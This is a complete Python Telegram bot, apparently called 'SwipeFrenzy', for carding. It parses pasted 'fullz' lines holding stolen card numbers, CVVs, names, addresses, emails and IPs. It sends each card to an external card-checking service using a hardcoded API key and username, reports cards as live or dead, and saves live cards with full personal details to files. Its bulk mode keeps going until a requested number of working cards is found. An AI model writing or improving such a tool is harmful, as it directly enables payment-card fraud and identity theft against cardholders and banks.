import telebot
import requests
import datetime
import random
import os
import time
import re
from telebot import types

# ==================== CONFIG ====================
TOKEN = os.getenv("TOKEN") or input("Enter your Telegram Bot Token: ")
API_KEY = os.getenv("LUX_KEY", "e243b2046e7cfeef3b9e8c28e9897d87")
USERNAME = os.getenv("LUX_USER", "EscoCCs")
BASE_URL = os.getenv("LUX_URL", "https://mirror1.luxchecker.vc/apiv2/")
CHECK_TYPE = "avk.php"
SLEEP_BETWEEN = 1.5
OUT_DIR = os.path.expanduser(os.getenv("OUT_DIR", "~"))
os.makedirs(OUT_DIR, exist_ok=True)
LIVES_PATH = os.path.join(OUT_DIR, "lives.txt")

bot = telebot.TeleBot(TOKEN)
user_data = {}

# ==================== HELPERS ====================
def normalize_exp(mm, yy):
    mm = re.sub(r"\D", "", str(mm))[-2:].zfill(2) if mm else ""
    yy = re.sub(r"\D", "", str(yy))
    if len(yy) == 2:
        yy = "20" + yy
    elif len(yy) == 3:
        yy = "2" + yy
    elif len(yy) > 4:
        yy = yy[-4:]
    return mm, yy

def split_name(parts, idx):
    """Return fname, lname, next_index."""
    if idx >= len(parts):
        return "JOHN", "DOE", idx
    tok = parts[idx].strip()
    if " " in tok and idx + 1 < len(parts) and not re.match(r"^\d", parts[idx + 1]):
        # single field "JOHN DOE" OR separate — prefer separate if next looks like addr
        pass
    if " " in tok:
        bits = tok.split(None, 1)
        return bits[0], bits[1] if len(bits) > 1 else "DOE", idx + 1
    fname = tok
    lname = parts[idx + 1].strip() if idx + 1 < len(parts) else "DOE"
    # if next looks like address (has digit), don't consume as lname
    if idx + 1 < len(parts) and re.search(r"\d", parts[idx + 1]):
        return fname, "DOE", idx + 1
    return fname, lname, idx + (2 if idx + 1 < len(parts) else 1)

def parse_fullz(text):
    """
    Accepts flexible pipe/comma/space lines.
    Returns list: [cc, mm, yyyy, cvv, fname, lname, addr, city, state, zip, country, email, ip]
    or None.
    """
    text = text.strip()
    if not text:
        return None
    if "|" in text:
        raw = [p.strip() for p in text.split("|")]
    elif "," in text:
        raw = [p.strip() for p in text.split(",")]
    else:
        raw = text.split()

    raw = [p for p in raw if p]
    if not raw:
        return None

    cc = re.sub(r"\D", "", raw[0])
    if len(cc) < 13 or len(cc) > 19:
        return None

    mm = yy = cvv = ""
    i = 1
    if i < len(raw) and re.match(r"^\d{1,2}/\d{2,4}$", raw[i]):
        mm, yy = raw[i].split("/")
        i += 1
    else:
        if i < len(raw) and re.match(r"^\d{1,2}$", raw[i]):
            mm = raw[i]; i += 1
        if i < len(raw) and re.match(r"^\d{2,4}$", raw[i]):
            yy = raw[i]; i += 1
    mm, yy = normalize_exp(mm, yy)

    if i < len(raw) and re.match(r"^\d{3,4}$", raw[i]):
        cvv = raw[i]; i += 1
    else:
        cvv = "000"

    fname, lname, i = split_name(raw, i)

    addr = raw[i] if i < len(raw) else ""
    i += 1 if addr else 0
    city = raw[i] if i < len(raw) else ""
    i += 1 if city else 0
    state = raw[i].upper()[:2] if i < len(raw) else ""
    i += 1 if state else 0
    zipc = raw[i] if i < len(raw) else ""
    i += 1 if zipc else 0
    country = raw[i].upper() if i < len(raw) else "US"
    if len(country) != 2:
        country = "US"
    else:
        i += 1
    email = ""
    ip = ""
    while i < len(raw):
        p = raw[i]
        if "@" in p:
            email = p
        elif re.match(r"^\d{1,3}(\.\d{1,3}){3}$", p):
            ip = p
        i += 1

    return [cc, mm, yy, cvv, fname, lname, addr, city, state, zipc, country, email, ip]

def brand_from_bin(cc):
    if cc.startswith("4"):
        return "Visa"
    if cc[:2] in ("51", "52", "53", "54", "55") or 2221 <= int(cc[:4] or 0) <= 2720:
        return "Mastercard"
    if cc.startswith(("34", "37")):
        return "Amex"
    if cc.startswith(("6011", "65", "644", "645", "646", "647", "648", "649")):
        return "Discover"
    return "Unknown"

# ==================== CHECK ====================
def check_card(parts):
    """
    parts = 13-field list from parse_fullz
    """
    try:
        payload = {
            "cardnum": parts[0],
            "expm": parts[1],
            "expy": parts[2],
            "cvv": parts[3],
            "fname": parts[4] or "JOHN",
            "lname": parts[5] or "DOE",
            "address": parts[6] or "1 MAIN ST",
            "city": parts[7] or "MIAMI",
            "state": parts[8] or "FL",
            "zip": parts[9] or "33101",
            "country": parts[10] or "US",
            "key": API_KEY,
            "username": USERNAME,
        }
        r = requests.get(BASE_URL + CHECK_TYPE, params=payload, timeout=20)
        text_body = r.text
        try:
            response = r.json()
        except Exception:
            return {
                "status": "error",
                "msg": f"HTTP {r.status_code} non-JSON: {text_body[:250]}",
            }

        if response.get("error"):
            return {"status": "error", "msg": str(response.get("error"))}

        # common lux-style shapes
        result = response.get("result")
        live = result == 1 or result == "1" or str(response.get("status", "")).lower() in (
            "live",
            "approved",
            "success",
        )

        if live:
            brand = brand_from_bin(parts[0])
            return {
                "status": "live",
                "raw": response,
                "data": {
                    "card": parts[0],
                    "exp": f"{parts[1]}/{parts[2]}",
                    "cvv": parts[3],
                    "name": f"{parts[4]} {parts[5]}".strip(),
                    "bank": str(response.get("bank") or response.get("bank_name") or "Unknown"),
                    "brand": brand,
                    "country": f"{parts[10]} • {brand}",
                    "address": f"{parts[6]}, {parts[7]}, {parts[8]} {parts[9]}".strip(", "),
                    "phone": str(response.get("phone") or "N/A"),
                    "email": parts[11] or "N/A",
                    "ip": parts[12] or "N/A",
                    "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                },
            }
        return {"status": "dead", "raw": response}
    except requests.Timeout:
        return {"status": "error", "msg": "API timeout"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}

def format_live_card(info):
    return f"""
══════════════════════════════════════
Name : {info['name']}
Card : {info['card']}
Expiry : {info['exp']}
CVV : {info['cvv']}
Bank : {info['bank']}
Brand : {info.get('brand', 'Unknown')}
Country : {info['country']}
Billing : {info['address']}
Phone : {info['phone']}
Email : {info['email']}
IP : {info['ip']}
Checked : {info['time']}
══════════════════════════════════════
""".strip()

def save_lives(cards, path=None):
    path = path or LIVES_PATH
    with open(path, "a", encoding="utf-8") as f:
        for c in cards:
            f.write(format_live_card(c) + "\n\n")
    return path

# ==================== COMMANDS ====================
@bot.message_handler(commands=["start"])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("/check", "/tester", "/cancel", "/status")
    bot.reply_to(
        message,
        "SwipeFrenzy bot ready.\n"
        "/check — bulk until N lives\n"
        "/tester — single card\n"
        "/cancel — reset state\n"
        "/status — current mode\n"
        "Send fullz as CC|MM|YYYY|CVV|FNAME|LNAME|ADDR|CITY|STATE|ZIP|COUNTRY",
        reply_markup=markup,
    )

@bot.message_handler(commands=["cancel"])
def cmd_cancel(message):
    user_data.pop(message.chat.id, None)
    bot.reply_to(message, "State cleared.")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    data = user_data.get(message.chat.id)
    if not data:
        bot.reply_to(message, "No active session. /check or /tester")
        return
    bot.reply_to(
        message,
        f"mode={data.get('mode')} target={data.get('target')} lives={len(data.get('lives', []))}",
    )

@bot.message_handler(commands=["check"])
def cmd_check(message):
    user_data[message.chat.id] = {"mode": "check", "target": 0, "lives": []}
    bot.reply_to(message, "How many live cards do you need? (number)")

@bot.message_handler(commands=["tester"])
def cmd_tester(message):
    user_data[message.chat.id] = {"mode": "tester", "target": 1, "lives": []}
    bot.reply_to(message, "Tester mode. Send one fullz line.")

@bot.message_handler(func=lambda m: True)
def handle(message):
    uid = message.chat.id
    text = (message.text or "").strip()
    if not text:
        return

    if uid not in user_data:
        bot.reply_to(message, "Use /start then /check or /tester first.")
        return

    data = user_data[uid]

    # set bulk target
    if data["mode"] == "check" and data["target"] == 0:
        if not text.isdigit() or int(text) < 1:
            bot.reply_to(message, "Send a positive number.")
            return
        data["target"] = int(text)
        bot.reply_to(message, f"Target {data['target']}. Paste cards one per message.")
        return

    parts = parse_fullz(text)
    if not parts:
        bot.reply_to(message, "Could not parse card. Need at least CC|MM|YY|CVV")
        return

    result = check_card(parts)
    time.sleep(SLEEP_BETWEEN)

    if result["status"] == "error":
        bot.reply_to(message, f"Error: {result.get('msg')}")
        return

    if result["status"] == "dead":
        bot.reply_to(message, "Dead")
        return

    # live
    info = result["data"]
    if data["mode"] == "tester":
        fn = os.path.join(OUT_DIR, f"tester{random.randint(1000, 9999)}.txt")
        save_lives([info], fn)
        bot.reply_to(message, f"LIVE\n{format_live_card(info)}\nSaved: {fn}")
        user_data.pop(uid, None)
        return

    # bulk
    data["lives"].append(info)
    n = len(data["lives"])
    bot.reply_to(message, f"LIVE ({n}/{data['target']})\n{format_live_card(info)}")
    if n >= data["target"]:
        path = save_lives(data["lives"])
        bot.reply_to(message, f"Target done. Appended {n} lives -> {path}")
        user_data.pop(uid, None)

# ==================== MAIN ====================
if __name__ == "__main__":
    print(f"Bot starting. Lives -> {LIVES_PATH}")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("Stopped")
